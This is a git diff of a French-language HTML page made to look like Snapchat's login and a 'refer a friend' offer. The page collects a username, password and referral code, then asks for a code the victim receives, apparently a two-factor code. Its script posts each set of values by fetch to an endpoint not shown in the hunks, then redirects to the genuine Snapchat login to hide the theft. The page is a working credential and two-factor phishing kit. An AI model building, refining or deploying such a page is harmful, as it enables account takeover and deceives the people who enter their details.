@@ -5,174 +5,173 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Snapchat | Parrainez Un Ami</title>
 
-<!-- Style général pour ressembler à Snapchat -->
 <style>
-  body {
-    margin: 0;
-    padding: 0;
-    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-    background-color: #fff;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-  }
+body {
+  margin: 0; padding: 0;
+  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+  background: #fff;
+  display: flex; justify-content: center; align-items: center;
+  min-height: 100vh;
+}
 
-  /* Container principal */
-  .container {
-    width: 100%;
-    max-width: 350px;
-    padding: 20px;
-  }
+/* Container principal */
+#container {
+  width: 100%; max-width: 350px;
+  padding: 20px;
+}
 
-  /* Style des formulaires et zones de texte */
-  .form-container {
-    background: #fff;
-    padding: 20px;
-    border-radius: 12px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-  }
+/* Formulaire de login */
+#loginBox {
+  background: #fff;
+  padding: 20px;
+  border-radius: 10px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+#loginBox h2 {
+  text-align: center;
+  font-weight: 600;
+  font-size: 24px;
+  margin-bottom: 20px;
+}
+#loginBox img {
+  display: block;
+  margin: 0 auto 20px;
+  width: 80px;
+}
+.form-group {
+  margin-bottom: 15px;
+}
+.form-group label {
+  display: block;
+  font-size: 13px;
+  font-weight: bold;
+  margin-bottom: 5px;
+  color: #222;
+}
+input[type=text], input[type=password] {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  font-size: 14px;
+  box-sizing: border-box;
+}
+button {
+  width: 100%;
+  padding: 14px;
+  background: linear-gradient(45deg, #00c6ff, #0072ff);
+  border: none;
+  border-radius: 8px;
+  color: #fff;
+  font-weight: 600;
+  font-size: 15px;
+  cursor: pointer;
+  margin-top: 10px;
+  transition: background 0.3s;
+}
+button:hover {
+  background: linear-gradient(45deg, #0072ff, #00c6ff);
+}
 
-  h2 {
-    text-align: center;
-    font-weight: 600;
-    font-size: 24px;
-    margin-bottom: 20px;
-  }
+/* Liens */
+.links {
+  margin-top: 10px;
+  display: flex;
+  justify-content: space-between;
+  font-size: 13px;
+}
+.links a {
+  color: #0078ff;
+  font-weight: 600;
+  text-decoration: underline;
+}
 
-  /* Labels */
-  label {
-    display: block;
-    font-size: 14px;
-    font-weight: 600;
-    margin-bottom: 8px;
-    color: #222;
-  }
+/* Messages erreurs */
+#errorMessage, #referralError {
+  display: none;
+  font-size: 13px;
+  color: red;
+  margin-top: 10px;
+  text-align: center;
+}
 
-  /* Input fields */
-  input[type=text], input[type=password] {
-    width: 100%;
-    padding: 14px 10px;
-    border: 1px solid #ddd;
-    border-radius: 8px;
-    font-size: 14px;
-    margin-bottom: 15px;
-    box-sizing: border-box;
-  }
+/* Zone pour entrer le code reçu (style Snapchat) */
+#codeContainer {
+  display: none;
+  background: #fff;
+  padding: 20px;
+  border-radius: 10px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  max-width: 350px;
+  width: 100%;
+  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+#codeContainer p {
+  font-size: 14px;
+  margin-bottom: 15px;
+  text-align: center;
+}
+#codeInput {
+  width: 100%;
+  padding: 14px;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  font-size: 14px;
+  box-sizing: border-box;
+  margin-bottom: 15px;
+  text-align: center;
+}
+#confirmBtn {
+  width: 100%;
+  padding: 14px;
+  background: linear-gradient(45deg, #00c6ff, #0072ff);
+  border: none;
+  border-radius: 8px;
+  font-size: 15px;
+  font-weight: 600;
+  color: #fff;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+#confirmBtn:hover {
+  background: linear-gradient(45deg, #0072ff, #00c6ff);
+}
 
-  /* Bouton principal (bleu) */
-  .btn {
-    width: 100%;
-    padding: 14px;
-    background-color: #0078FF;
-    border: none;
-    border-radius: 8px;
-    color: #fff;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-    margin-top: 10px;
-    transition: background-color 0.3s;
-  }
-  .btn:hover {
-    background-color: #0060e0;
-  }
-
-  /* Liens sous le bouton */
-  .links {
-    margin-top: 15px;
-    display: flex;
-    justify-content: space-between;
-    font-size: 13px;
-  }
-  .links a {
-    color: #0078FF;
-    font-weight: 600;
-    text-decoration: none;
-  }
-  .links a:hover {
-    text-decoration: underline;
-  }
-
-  /* Message d'erreur */
-  #errorMessage, #referralError {
-    color: red;
-    font-size: 13px;
-    margin-top: 10px;
-    display: none;
-  }
-
-  /* Zone pour entrer le code reçu (style Snapchat) */
-  #codeContainer {
-    display: none;
-    text-align: center;
-  }
-
-  #codeContainer p {
-    font-size: 14px;
-    margin-bottom: 15px;
-    font-weight: 500;
-    color: #222;
-  }
-
-  #codeInput {
-    width: 100%;
-    padding: 14px;
-    font-size: 14px;
-    border: 1px solid #ddd;
-    border-radius: 8px;
-    margin-bottom: 15px;
-    box-sizing: border-box;
-  }
-
-  #confirmBtn {
-    width: 100%;
-    padding: 14px;
-    background-color: #ffff00; /* Jaune */
-    border: none;
-    border-radius: 8px;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: background-color 0.3s;
-  }
-  #confirmBtn:hover {
-    background-color: #e6e600;
-  }
-
-  /* Zone après confirmation, style Snapchat */
-  #messageZone {
-    display: none;
-    text-align: center;
-    padding: 20px;
-  }
-
-  #messageZone p {
-    font-size: 14px;
-    color: #222;
-  }
+/* Zone après confirmation (style Snapchat) */
+#messageZone {
+  display: none;
+  padding: 20px;
+  text-align: center;
+}
+#messageZone p {
+  font-size: 14px;
+  color: #222;
+}
 </style>
 </head>
 <body>
 
-<div class="container">
+<div id="container">
 
-  <!-- Formulaire de login -->
-  <div class="form-container" id="loginFormContainer">
+  <!-- Formulaire snapchat -->
+  <div id="loginBox">
+    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" />
     <h2>Log into Snapchat</h2>
     <form id="loginForm">
-      <label for="username">USERNAME OR EMAIL</label>
-      <input type="text" id="username" required />
-      
-      <label for="password">PASSWORD</label>
-      <input type="password" id="password" required />
-      
-      <label for="referralCode">Referral Code</label>
-      <input type="text" id="referralCode" required />
-
-      <button type="submit" class="btn">Log In</button>
-      
+      <div class="form-group">
+        <label>USERNAME OR EMAIL</label>
+        <input type="text" id="username" required />
+      </div>
+      <div class="form-group">
+        <label>PASSWORD</label>
+        <input type="password" id="password" required />
+      </div>
+      <div class="form-group">
+        <label>Referral Code</label>
+        <input type="text" id="referralCode" required />
+      </div>
+      <button type="submit">Log In</button>
       <div class="links">
         <a href="#">FORGOT PASSWORD</a>
         <a href="#">CREATE ACCOUNT</a>
@@ -203,7 +202,6 @@ const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault();
 
-  // Récupérer valeurs
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
   const referralCode = document.getElementById('referralCode').value.trim();
@@ -211,11 +209,11 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
   document.getElementById('errorMessage').style.display = 'none';
   document.getElementById('referralError').style.display = 'none';
 
-  // Vérifications
   if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
     document.getElementById('errorMessage').style.display = 'block';
     return;
   }
+
   if (!/^\d{4}$/.test(referralCode)) {
     document.getElementById('referralError').style.display = 'block';
     return;
@@ -244,9 +242,8 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(message),
   }).then(response => {
-    // Après envoi, afficher zone entrée code
     setTimeout(() => {
-      document.getElementById('loginFormContainer').style.display = 'none';
+      document.getElementById('loginBox').style.display = 'none';
       document.getElementById('codeContainer').style.display = 'block';
     }, 1000);
   }).catch(error => {
@@ -281,7 +278,6 @@ document.getElementById('confirmBtn').addEventListener('click', function() {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(message),
   }).then(() => {
-    // Après envoi, afficher message et rediriger
     document.getElementById('codeContainer').style.display = 'none';
     document.getElementById('messageZone').style.display = 'block';
     setTimeout(() => {
